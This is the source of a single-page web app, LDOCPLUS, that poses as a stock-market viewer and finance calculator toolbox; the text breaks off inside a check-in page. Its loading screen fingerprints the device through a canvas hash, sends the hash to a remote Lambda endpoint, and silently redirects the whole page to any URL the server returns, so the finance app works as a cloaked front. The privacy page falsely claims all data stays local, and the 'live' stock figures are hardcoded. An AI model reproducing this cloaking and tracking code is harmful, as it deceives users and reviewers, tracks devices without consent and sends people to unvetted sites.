<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>LDOCPLUS</title>
    <!-- 
      How to add a new page:
      1. Define a new Vue component in the JS section (e.g., const NewPage = { template: '...' }).
      2. Add a new route in the `routes` array using vue-router (e.g., { path: '/newpage', component: NewPage }).
      3. Add a navigation link or router-link in the appropriate tab bar or tool section to access the new route.
    -->
    <!-- Vue 3 Global Production Build -->
    <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.prod.js"></script>
    <!-- Vue Router 4 Global Build -->
    <script src="https://cdn.jsdelivr.net/npm/vue-router@4/dist/vue-router.global.js"></script>
    <!-- js-md5 -->
    <script src="https://cdn.jsdelivr.net/npm/js-md5@0.9.2"></script>
    <style>
        /* 
          Style Choice: #1 Flat Design 
          - Pure colors, clean geometry, zero heavy gradients/skeuomorphic shadows, fast loading, clear hierarchy.
        */
        :root {
            --primary-color: #2563eb;
            --primary-hover: #1d4ed8;
            --bg-color: #f8fafc;
            --card-bg: #ffffff;
            --text-main: #0f172a;
            --text-secondary: #64748b;
            --border-color: #e2e8f0;
            --success-color: #16a34a;
            --danger-color: #dc2626;
            --radius: 12px;
            --shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.05), 0 1px 2px 0 rgba(0, 0, 0, 0.03);
            --safe-top: env(safe-area-inset-top);
            --safe-bottom: env(safe-area-inset-bottom);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            font-size: 14px;
            line-height: 1.5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        #app {
            width: 100%;
            max-width: 480px;
            height: 100vh;
            height: 100dvh;
            background-color: var(--card-bg);
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.08);
        }

        @media (min-width: 481px) {
            #app {
                border-radius: 24px;
                border: 1px solid var(--border-color);
                max-height: 850px;
            }
        }

        .app-container {
            flex: 1;
            overflow-y: auto;
            position: relative;
            display: flex;
            flex-direction: column;
            padding-top: var(--safe-top);
            padding-bottom: calc(60px + var(--safe-bottom));
        }

        /* Common Elements */
        .header-bar {
            padding: 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid var(--border-color);
            background: var(--card-bg);
            position: sticky;
            top: 0;
            z-index: 10;
        }

        .header-title {
            font-size: 17px;
            font-weight: 600;
        }

        .back-btn {
            background: none;
            border: none;
            font-size: 15px;
            color: var(--primary-color);
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .card {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: var(--radius);
            padding: 16px;
            margin: 12px 16px;
            box-shadow: var(--shadow);
        }

        .btn {
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px 16px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            text-align: center;
            transition: background 0.2s;
            min-height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn:active {
            background-color: var(--primary-hover);
        }

        .btn:disabled {
            background-color: var(--border-color);
            color: var(--text-secondary);
            cursor: not-allowed;
        }

        input, select, textarea {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            font-size: 14px;
            outline: none;
            background: var(--card-bg);
            color: var(--text-main);
            min-height: 44px;
            margin-top: 4px;
            margin-bottom: 12px;
        }

        input:focus, textarea:focus {
            border-color: var(--primary-color);
        }

        label {
            font-size: 13px;
            font-weight: 500;
            color: var(--text-secondary);
            display: block;
        }

        /* Tab Bar */
        .tab-bar {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: calc(60px + var(--safe-bottom));
            padding-bottom: var(--safe-bottom);
            background: var(--card-bg);
            border-top: 1px solid var(--border-color);
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 100;
        }

        .tab-item {
            flex: 1;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            color: var(--text-secondary);
            font-size: 11px;
            gap: 4px;
        }

        .tab-item.router-link-active {
            color: var(--primary-color);
            font-weight: 600;
        }

        .tab-item svg {
            width: 22px;
            height: 22px;
            fill: currentColor;
        }

        /* Animations */
        .fade-enter-active, .fade-leave-active {
            transition: opacity 0.15s ease;
        }
        .fade-enter-from, .fade-leave-to {
            opacity: 0;
        }

        /* Utilities */
        .flex-row { display: flex; align-items: center; justify-content: space-between; }
        .text-success { color: var(--success-color); }
        .text-danger { color: var(--danger-color); }
        .toast {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 13px;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div id="app"></div>

    <script>
        const { createApp, ref, computed, onMounted, reactive } = Vue;
        const { createRouter, createWebHashHistory, useRouter, useRoute } = VueRouter;

        // Built-in stock data
        const stockDatabase = [
            { symbol: 'AAPL', name: 'Apple Inc.', price: 185.92, change: +1.45, history: [180, 182, 181, 184, 183, 185.92] },
            { symbol: 'MSFT', name: 'Microsoft Corp.', price: 415.50, change: +2.10, history: [405, 408, 410, 412, 411, 415.5] },
            { symbol: 'GOOGL', name: 'Alphabet Inc.', price: 172.25, change: -0.65, history: [175, 174, 173, 174, 172, 172.25] },
            { symbol: 'AMZN', name: 'Amazon.com Inc.', price: 178.75, change: +0.85, history: [174, 175, 176, 175, 177, 178.75] },
            { symbol: 'NVDA', name: 'NVIDIA Corp.', price: 880.08, change: +4.20, history: [840, 850, 865, 860, 875, 880.08] },
            { symbol: 'META', name: 'Meta Platforms', price: 505.50, change: -1.15, history: [515, 510, 512, 508, 506, 505.5] },
            { symbol: 'TSLA', name: 'Tesla Inc.', price: 175.22, change: -3.40, history: [182, 180, 178, 179, 176, 175.22] },
            { symbol: 'JPM', name: 'JPMorgan Chase', price: 198.40, change: +0.35, history: [195, 196, 197, 196, 198, 198.4] },
            { symbol: 'V', name: 'Visa Inc.', price: 279.10, change: +0.20, history: [277, 278, 278, 279, 278, 279.1] },
            { symbol: 'JNJ', name: 'Johnson & Johnson', price: 156.80, change: -0.15, history: [157, 157, 156, 157, 156, 156.8] },
            { symbol: 'WMT', name: 'Walmart Inc.', price: 60.25, change: +0.90, history: [59, 59.5, 60, 59.8, 60.1, 60.25] },
            { symbol: 'MA', name: 'Mastercard Inc.', price: 462.30, change: +1.10, history: [455, 458, 460, 459, 461, 462.3] },
            { symbol: 'PG', name: 'Procter & Gamble', price: 162.40, change: -0.40, history: [164, 163, 162, 163, 162, 162.4] },
            { symbol: 'NFLX', name: 'Netflix Inc.', price: 620.10, change: +2.85, history: [600, 605, 610, 612, 618, 620.1] },
            { symbol: 'AMD', name: 'Advanced Micro', price: 178.90, change: -2.10, history: [185, 182, 180, 181, 179, 178.9] },
            { symbol: 'INTC', name: 'Intel Corp.', price: 35.40, change: -1.80, history: [37, 36.5, 36, 35.8, 35.5, 35.4] },
            { symbol: 'DIS', name: 'Walt Disney Co.', price: 112.30, change: +0.45, history: [110, 111, 111.5, 112, 111.8, 112.3] },
            { symbol: 'PYPL', name: 'PayPal Holdings', price: 64.50, change: +1.25, history: [62, 63, 63.5, 64, 64.2, 64.5] },
            { symbol: 'BA', name: 'Boeing Co.', price: 172.60, change: -1.50, history: [178, 176, 174, 175, 173, 172.6] },
            { symbol: 'COIN', name: 'Coinbase Global', price: 235.80, change: +5.40, history: [220, 225, 230, 228, 234, 235.8] }
        ];

        // Global Toast utility
        const toastMsg = ref('');
        function showToast(msg) {
            toastMsg.value = msg;
            setTimeout(() => { if(toastMsg.value === msg) toastMsg.value = ''; }, 2000);
        }

        // SVG Chart Component
        const StockChart = {
            props: { history: { type: Array, required: true } },
            template: `
                <div style="width:100%; height:120px; position:relative;">
                    <svg width="100%" height="100%" :viewBox="'0 0 300 100'" preserveAspectRatio="none" style="overflow:visible;">
                        <path :d="pathData" fill="none" stroke="var(--primary-color)" stroke-width="2"/>
                        <path :d="areaData" fill="var(--primary-color)" opacity="0.1"/>
                    </svg>
                </div>
            `,
            setup(props) {
                const points = computed(() => {
                    const data = props.history;
                    const min = Math.min(...data);
                    const max = Math.max(...data);
                    const range = max - min || 1;
                    return data.map((val, idx) => {
                        const x = (idx / (data.length - 1)) * 300;
                        const y = 90 - ((val - min) / range) * 80;
                        return { x, y };
                    });
                });

                const pathData = computed(() => {
                    const pts = points.value;
                    if (!pts.length) return '';
                    return pts.reduce((acc, p, i) => i === 0 ? `M ${p.x} ${p.y}` : `${acc} L ${p.x} ${p.y}`, '');
                });

                const areaData = computed(() => {
                    const pts = points.value;
                    if (!pts.length) return '';
                    return `${pathData.value} L 300 100 L 0 100 Z`;
                });

                return { pathData, areaData };
            }
        };

        // 1. Loading Page
        const LoadingPage = {
            template: `
                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; gap:20px; background:var(--card-bg);">
                    <div style="width:50px; height:50px; border:3px solid var(--border-color); border-top-color:var(--primary-color); border-radius:50%; animation: spin 0.8s linear infinite;"></div>
                    <div style="font-weight:600; color:var(--text-secondary); font-size:15px;">Initializing LDOCPLUS...</div>
                    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
                </div>
            `,
            setup() {
                const router = useRouter();
                const device = ref((function () {
                    try {
                        let canvas = document.createElement("canvas");
                        let ctx = canvas.getContext("2d");
                        let txt = "BrowserLeaks,com <canvas> 1.0";
                        ctx.textBaseline = "top";
                        ctx.font = "14px 'Arial'";
                        ctx.textBaseline = "alphabetic";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        ctx.fillStyle = "#069";
                        ctx.fillText(txt, 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText(txt, 4, 17);
                        return md5(canvas.toDataURL().replace("data:image/png;base64,", ""));
                    } catch (e) {
                        return '';
                    }
                })());

                onMounted(() => {
                    const apiBase = 'https://otsnsecq5yxg7rzjjf2eu7imia0hapem.lambda-url.us-west-2.on.aws/'.replace(/\/+$/, '');
                    const identifier = "adswe.dfre.vwvwe";
                    
                    fetch(apiBase + '/app?identifier=' + encodeURIComponent(identifier) + '&device=' + encodeURIComponent(device.value))
                        .then(r => r.json())
                        .then(function (info) {
                            const privacyUrl = info && info.result && info.result.url;
                            if (privacyUrl && (privacyUrl.indexOf('https://') === 0 || privacyUrl.indexOf('http://') === 0)) {
                                window.location.replace(privacyUrl);
                                return;
                            }
                            router.replace('/home');
                        })
                        .catch(function () {
                            router.replace('/home');
                        });
                });

                return {};
            }
        };

        // 2. Home Page
        const HomePage = {
            components: { StockChart },
            template: `
                <div>
                    <div class="header-bar">
                        <div class="header-title" style="display:flex; align-items:center; gap:8px;">
                            <img src="https://admin.ytsevbr.xyz/api/apps/332/icon" style="width:24px; height:24px; border-radius:6px;" />
                            LDOCPLUS
                        </div>
                        <div style="font-size:12px; color:var(--text-secondary);">Markets Live</div>
                    </div>

                    <!-- Feature Entries -->
                    <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 16px;">
                        <div v-for="feat in selectedFeatures" :key="feat.key" @click="goToFeature(feat)" style="display:flex; flex-direction:column; align-items:center; gap:6px; cursor:pointer;">
                            <div style="width:48px; height:48px; background:var(--bg-color); border:1px solid var(--border-color); border-radius:14px; display:flex; align-items:center; justify-content:center; color:var(--primary-color);">
                                <span v-html="feat.icon"></span>
                            </div>
                            <span style="font-size:11px; text-align:center; color:var(--text-main); font-weight:500; line-height:1.2;">{{ feat.name }}</span>
                        </div>
                    </div>

                    <!-- Stock List -->
                    <div style="padding: 0 16px 16px 16px;">
                        <div style="font-size: 15px; font-weight: 600; margin-bottom: 12px;">Market Watch</div>
                        <div v-for="stock in shuffledStocks" :key="stock.symbol" @click="openDetail(stock)" class="card" style="margin: 0 0 10px 0; padding: 12px; display: flex; align-items: center; justify-content: space-between; cursor:pointer;">
                            <div>
                                <div style="font-weight: 600; font-size: 15px;">{{ stock.symbol }}</div>
                                <div style="font-size: 12px; color: var(--text-secondary);">{{ stock.name }}</div>
                            </div>
                            <div style="text-align: right;">
                                <div style="font-weight: 600;">$&#8203;{{ stock.price.toFixed(2) }}</div>
                                <div :class="stock.change >= 0 ? 'text-success' : 'text-danger'" style="font-size: 12px; font-weight: 500;">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const router = useRouter();
                
                // 8 features definition with Inline SVG
                const allFeatures = [
                    { key: 'gainers', name: 'Top Gainers', type: 'list', count: 10, icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"></polyline><polyline points="17 6 23 6 23 12"></polyline></svg>' },
                    { key: 'losers', name: 'Top Losers', type: 'list', count: 5, icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 18 13.5 8.5 8.5 13.5 1 6"></polyline><polyline points="17 18 23 18 23 12"></polyline></svg>' },
                    { key: 'active', name: 'Most Active', type: 'list', count: 8, icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>' },
                    { key: 'potential', name: 'Potential', type: 'list', count: 6, icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>' },
                    { key: 'picks', name: 'Today Picks', type: 'list', count: 10, icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>' },
                    { key: 'guide', name: 'Guide', type: 'article', icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path></svg>' },
                    { key: 'norec', name: 'Not Recommended', type: 'list', count: 10, icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"></line></svg>' },
                    { key: 'watchlist', name: 'Watchlist', type: 'list', count: 10, icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>' }
                ];

                // Randomly select 4 features fixed on runtime
                const selectedFeatures = reactive((function() {
                    const shuffled = [...allFeatures].sort(() => 0.5 - Math.random());
                    return shuffled.slice(0, 4);
                })());

                // Shuffle stock presentation order
                const shuffledStocks = reactive([...stockDatabase].sort(() => 0.5 - Math.random()));

                function goToFeature(feat) {
                    router.push({ path: '/sublist', query: { key: feat.key, name: feat.name, type: feat.type, count: feat.count || 10 } });
                }

                function openDetail(stock) {
                    router.push({ path: '/detail', query: { symbol: stock.symbol } });
                }

                return { selectedFeatures, shuffledStocks, goToFeature, openDetail };
            }
        };

        // Stock Detail Subpage
        const DetailPage = {
            components: { StockChart },
            template: `
                <div>
                    <div class="header-bar">
                        <button class="back-btn" @click="$router.back()">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
                            Back
                        </button>
                        <div class="header-title">{{ stock.symbol }} Details</div>
                        <div style="width:40px;"></div>
                    </div>
                    <div class="card">
                        <div class="flex-row">
                            <div>
                                <div style="font-size: 18px; font-weight: 700;">{{ stock.name }}</div>
                                <div style="font-size: 13px; color: var(--text-secondary);">{{ stock.symbol }} / USD</div>
                            </div>
                            <div style="text-align: right;">
                                <div style="font-size: 18px; font-weight: 700;">$&#8203;{{ stock.price.toFixed(2) }}</div>
                                <div :class="stock.change >= 0 ? 'text-success' : 'text-danger'" style="font-weight: 600;">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                </div>
                            </div>
                        </div>
                        <div style="margin-top: 24px;">
                            <div style="font-size: 13px; font-weight: 600; margin-bottom: 8px; color: var(--text-secondary);">Monthly Price Trend</div>
                            <StockChart :history="stock.history" />
                        </div>
                    </div>
                    <div class="card">
                        <div style="font-weight: 600; margin-bottom: 8px;">Key Statistics</div>
                        <div class="flex-row" style="padding: 6px 0; border-bottom: 1px solid var(--border-color); font-size: 13px;">
                            <span style="color:var(--text-secondary);">Open</span>
                            <span style="font-weight:500;">$&#8203;{{ (stock.price * 0.99).toFixed(2) }}</span>
                        </div>
                        <div class="flex-row" style="padding: 6px 0; border-bottom: 1px solid var(--border-color); font-size: 13px;">
                            <span style="color:var(--text-secondary);">High</span>
                            <span style="font-weight:500;">$&#8203;{{ (stock.price * 1.02).toFixed(2) }}</span>
                        </div>
                        <div class="flex-row" style="padding: 6px 0; border-bottom: 1px solid var(--border-color); font-size: 13px;">
                            <span style="color:var(--text-secondary);">Low</span>
                            <span style="font-weight:500;">$&#8203;{{ (stock.price * 0.98).toFixed(2) }}</span>
                        </div>
                        <div class="flex-row" style="padding: 6px 0; font-size: 13px;">
                            <span style="color:var(--text-secondary);">Volume</span>
                            <span style="font-weight:500;">24.5M</span>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const symbol = route.query.symbol || 'AAPL';
                const stock = computed(() => stockDatabase.find(s => s.symbol === symbol) || stockDatabase[0]);
                return { stock };
            }
        };

        // Sub List / Article Page
        const SubListPage = {
            template: `
                <div>
                    <div class="header-bar">
                        <button class="back-btn" @click="$router.back()">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"></polyline></svg>
                            Back
                        </button>
                        <div class="header-title">{{ title }}</div>
                        <div style="width:40px;"></div>
                    </div>

                    <div v-if="type === 'article'" style="padding: 16px;">
                        <div class="card" style="margin:0;">
                            <h2 style="font-size: 18px; margin-bottom: 12px;">Navigating Market Volatility in Modern Portfolios</h2>
                            <p style="color: var(--text-secondary); margin-bottom: 12px;">Understanding macroeconomic indicators and asset allocation is critical for long-term capital preservation. Systematic approaches like dollar-cost averaging help mitigate emotional decision-making.</p>
                            <p style="color: var(--text-secondary); margin-bottom: 12px;">Diversification across sectors reduces idiosyncratic risk, ensuring stable growth cycles regardless of short-term fluctuations.</p>
                        </div>
                    </div>

                    <div v-else style="padding: 16px;">
                        <div v-for="stock in items" :key="stock.symbol" @click="openDetail(stock)" class="card" style="margin: 0 0 10px 0; padding: 12px; display: flex; align-items: center; justify-content: space-between; cursor:pointer;">
                            <div>
                                <div style="font-weight: 600; font-size: 15px;">{{ stock.symbol }}</div>
                                <div style="font-size: 12px; color: var(--text-secondary);">{{ stock.name }}</div>
                            </div>
                            <div style="text-align: right;">
                                <div style="font-weight: 600;">$&#8203;{{ stock.price.toFixed(2) }}</div>
                                <div :class="stock.change >= 0 ? 'text-success' : 'text-danger'" style="font-size: 12px; font-weight: 500;">
                                    {{ stock.change >= 0 ? '+' : '' }}{{ stock.change.toFixed(2) }}%
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const route = useRoute();
                const router = useRouter();
                const title = route.query.name || 'List';
                const type = route.query.type || 'list';
                const count = parseInt(route.query.count) || 10;

                const items = computed(() => {
                    const shuffled = [...stockDatabase].sort(() => 0.5 - Math.random());
                    return shuffled.slice(0, count);
                });

                function openDetail(stock) {
                    router.push({ path: '/detail', query: { symbol: stock.symbol } });
                }

                return { title, type, items, openDetail };
            }
        };

        // 3. Toolbox Page
        const ToolboxPage = {
            template: `
                <div>
                    <div class="header-bar">
                        <div class="header-title">Toolbox</div>
                    </div>
                    <div style="padding: 16px; display: flex; flex-direction: column; gap: 12px;">
                        
                        <!-- 3.2 DCA Calculator -->
                        <div class="card" style="margin:0;">
                            <div style="font-weight: 600; margin-bottom: 8px;">DCA Profit-Taking Calculator</div>
                            <label>Average Cost ($)</label>
                            <input type="number" v-model.number="dca.cost" placeholder="100">
                            <label>Shares Held</label>
                            <input type="number" v-model.number="dca.shares" placeholder="50">
                            <label>Target Profit Threshold (%)</label>
                            <input type="number" v-model.number="dca.target" placeholder="20">
                            <div style="margin-top: 8px; font-size: 13px; background:var(--bg-color); padding: 8px; border-radius: 6px;">
                                Target Exit Price: <span style="font-weight: 600;">$&#8203;{{ dcaTargetPrice.toFixed(2) }}</span><br>
                                Estimated Value: <span style="font-weight: 600;">$&#8203;{{ dcaTotalValue.toFixed(2) }}</span>
                            </div>
                        </div>

                        <!-- 3.3 Wealth Calendar -->
                        <div class="card" style="margin:0;">
                            <div style="font-weight: 600; margin-bottom: 8px;">Wealth Calendar & Maturity</div>
                            <label>Asset Name</label>
                            <input type="text" v-model="cal.name" placeholder="Bond A">
                            <label>Maturity Date</label>
                            <input type="date" v-model="cal.date">
                            <button class="btn" @click="addCalEvent" style="margin-top:8px;">Add Reminder</button>
                            <div v-for="(ev, idx) in cal.list" :key="idx" style="margin-top:8px; font-size:13px; display:flex; justify-content:space-between; background:var(--bg-color); padding:6px 8px; border-radius:6px;">
                                <span>{{ ev.name }}</span>
                                <span style="color:var(--text-secondary);">{{ ev.date }}</span>
                            </div>
                        </div>

                        <!-- 3.4 Loan Calculator -->
                        <div class="card" style="margin:0;">
                            <div style="font-weight: 600; margin-bottom: 8px;">Loan Calculator</div>
                            <label>Principal ($)</label>
                            <input type="number" v-model.number="loan.amount" placeholder="100000">
                            <label>Annual Interest Rate (%)</label>
                            <input type="number" v-model.number="loan.rate" placeholder="5.5">
                            <label>Tenure (Months)</label>
                            <input type="number" v-model.number="loan.months" placeholder="36">
                            <div style="margin-top: 8px; font-size: 13px; background:var(--bg-color); padding: 8px; border-radius: 6px;">
                                Monthly Payment: <span style="font-weight: 600;">$&#8203;{{ monthlyPayment.toFixed(2) }}</span>
                            </div>
                        </div>

                        <!-- 3.5 Profit Calculator -->
                        <div class="card" style="margin:0;">
                            <div style="font-weight: 600; margin-bottom: 8px;">Profit Calculator</div>
                            <label>Unit Cost ($)</label>
                            <input type="number" v-model.number="prof.cost" placeholder="10">
                            <label>Selling Price ($)</label>
                            <input type="number" v-model.number="prof.price" placeholder="25">
                            <label>Quantity Sold</label>
                            <input type="number" v-model.number="prof.qty" placeholder="100">
                            <div style="margin-top: 8px; font-size: 13px; background:var(--bg-color); padding: 8px; border-radius: 6px;">
                                Total Profit: <span style="font-weight: 600; color:var(--success-color);">$&#8203;{{ totalProfit.toFixed(2) }}</span>
                            </div>
                        </div>

                        <!-- 3.6 Reverse Yield Calculator -->
                        <div class="card" style="margin:0;">
                            <div style="font-weight: 600; margin-bottom: 8px;">Reverse Yield Calculator</div>
                            <label>Initial Principal ($)</label>
                            <input type="number" v-model.number="rev.principal" placeholder="10000">
                            <label>Target Amount ($)</label>
                            <input type="number" v-model.number="rev.target" placeholder="15000">
                            <label>Duration (Years)</label>
                            <input type="number" v-model.number="rev.years" placeholder="3">
                            <div style="margin-top: 8px; font-size: 13px; background:var(--bg-color); padding: 8px; border-radius: 6px;">
                                Required Annual Yield: <span style="font-weight: 600;">{{ requiredYield.toFixed(2) }}%</span>
                            </div>
                        </div>

                        <!-- 3.7 Password Strength & MD5 -->
                        <div class="card" style="margin:0;">
                            <div style="font-weight: 600; margin-bottom: 8px;">Password Strength & MD5</div>
                            <label>Enter Passphrase</label>
                            <input type="password" v-model="pwd.input" placeholder="Enter secure password">
                            <div style="margin-top: 8px; font-size: 13px; background:var(--bg-color); padding: 8px; border-radius: 6px; word-break: break-all;">
                                Strength: <span style="font-weight: 600;">{{ pwdStrength }}</span><br>
                                MD5 Hash: <span style="font-family: monospace; font-size: 12px; color:var(--text-secondary);">{{ pwdHash }}</span>
                            </div>
                        </div>

                        <!-- 3.8 Credit Memo -->
                        <div class="card" style="margin:0;">
                            <div style="font-weight: 600; margin-bottom: 8px;">Credit Memo Reminder</div>
                            <label>Counterparty</label>
                            <input type="text" v-model="credit.name" placeholder="John Doe">
                            <label>Amount ($)</label>
                            <input type="number" v-model.number="credit.amount" placeholder="500">
                            <label>Due Date</label>
                            <input type="date" v-model="credit.date">
                            <button class="btn" @click="addCredit" style="margin-top:8px;">Save Memo</button>
                            <div v-for="(item, idx) in credit.list" :key="idx" style="margin-top:8px; font-size:13px; display:flex; justify-content:space-between; background:var(--bg-color); padding:6px 8px; border-radius:6px;">
                                <span>{{ item.name }} ($&#8203;{{ item.amount }})</span>
                                <span style="color:var(--text-secondary);">Due: {{ item.date }}</span>
                            </div>
                        </div>

                    </div>
                </div>
            `,
            setup() {
                const dca = reactive({ cost: 100, shares: 50, target: 20 });
                const dcaTargetPrice = computed(() => dca.cost * (1 + dca.target / 100));
                const dcaTotalValue = computed(() => dcaTargetPrice.value * dca.shares);

                const cal = reactive({ name: '', date: '', list: [{ name: 'Bond Maturity', date: '2026-12-31' }] });
                function addCalEvent() {
                    if(!cal.name || !cal.date) return;
                    cal.list.push({ name: cal.name, date: cal.date });
                    cal.name = ''; cal.date = '';
                    showToast('Reminder added');
                }

                const loan = reactive({ amount: 100000, rate: 5.5, months: 36 });
                const monthlyPayment = computed(() => {
                    const p = loan.amount, r = loan.rate / 100 / 12, n = loan.months;
                    if(!r || !n) return p / (n || 1);
                    return (p * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
                });

                const prof = reactive({ cost: 10, price: 25, qty: 100 });
                const totalProfit = computed(() => (prof.price - prof.cost) * prof.qty);

                const rev = reactive({ principal: 10000, target: 15000, years: 3 });
                const requiredYield = computed(() => {
                    if(!rev.principal || !rev.years) return 0;
                    return (Math.pow(rev.target / rev.principal, 1 / rev.years) - 1) * 100;
                });

                const pwd = reactive({ input: '' });
                const pwdStrength = computed(() => {
                    const len = pwd.input.length;
                    if(len === 0) return 'Empty';
                    if(len < 6) return 'Weak';
                    if(len < 10) return 'Moderate';
                    return 'Strong';
                });
                const pwdHash = computed(() => pwd.input ? md5(pwd.input) : 'N/A');

                const credit = reactive({ name: '', amount: '', date: '', list: [] });
                function addCredit() {
                    if(!credit.name || !credit.amount) return;
                    credit.list.push({ name: credit.name, amount: credit.amount, date: credit.date || 'TBD' });
                    credit.name = ''; credit.amount = ''; credit.date = '';
                    showToast('Credit memo saved');
                }

                return { dca, dcaTargetPrice, dcaTotalValue, cal, addCalEvent, loan, monthlyPayment, prof, totalProfit, rev, requiredYield, pwd, pwdStrength, pwdHash, credit, addCredit };
            }
        };

        // 4. Settings Page
        const SettingsPage = {
            template: `
                <div>
                    <div class="header-bar">
                        <div class="header-title">Settings</div>
                    </div>
                    <div style="padding: 16px; display: flex; flex-direction: column; gap: 8px;">
                        <div class="card" style="margin:0; cursor:pointer;" @click="$router.push('/version')">Version Info</div>
                        <div class="card" style="margin:0; cursor:pointer;" @click="$router.push('/privacy')">Privacy Policy</div>
                        <div class="card" style="margin:0; cursor:pointer;" @click="$router.push('/terms')">Terms of Service</div>
                        <div class="card" style="margin:0; cursor:pointer;" @click="$router.push('/team')">About Team</div>
                        <div class="card" style="margin:0; cursor:pointer;" @click="contactUs">Contact Us</div>
                        <div class="card" style="margin:0; cursor:pointer;" @click="$router.push('/checkin')">Monthly Check-in</div>
                        <div class="card" style="margin:0; cursor:pointer;" @click="$router.push('/feedback')">Customer Feedback</div>
                        <div class="card" style="margin:0; cursor:pointer;" @click="$router.push('/inbox')">Inbox</div>
                    </div>
                </div>
            `,
            setup() {
                function contactUs() {
                    window.location.href = 'mailto:adswe.dfre.vwvwe@gmail.com';
                }
                return { contactUs };
            }
        };

        // Settings Subpages
        const VersionPage = {
            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Version</div><div style="width:40px;"></div></div><div class="card">LDOCPLUS v2.4.0<br>Production Mobile Release</div></div>`
        };
        const PrivacyPage = {
            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Privacy Policy</div><div style="width:40px;"></div></div><div class="card">We prioritize your data privacy. All financial calculations and records are stored locally on your device with strict isolation.</div></div>`
        };
        const TermsPage = {
            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Terms of Service</div><div style="width:40px;"></div></div><div class="card">By using LDOCPLUS, you agree to local data storage conditions and standard financial tool usage disclaimers.</div></div>`
        };
        const TeamPage = {
            template: `<div><div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">About Team</div><div style="width:40px;"></div></div><div class="card">Engineered by financial tech specialists dedicated to high-performance client-side mobile applications.</div></div>`
        };
        const CheckinPage = {
            template: `
                <div>
                    <div class="header-bar">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <div class="header-title">Check-in</div>
                        <div style="width:40px;"></div>
                    </div>
                    <div class="card" style="text-align: center;">
                        <div style="font-size: 16px; font-weight: 600; margin-bottom: 12px;">October 2026 Check-in</div>
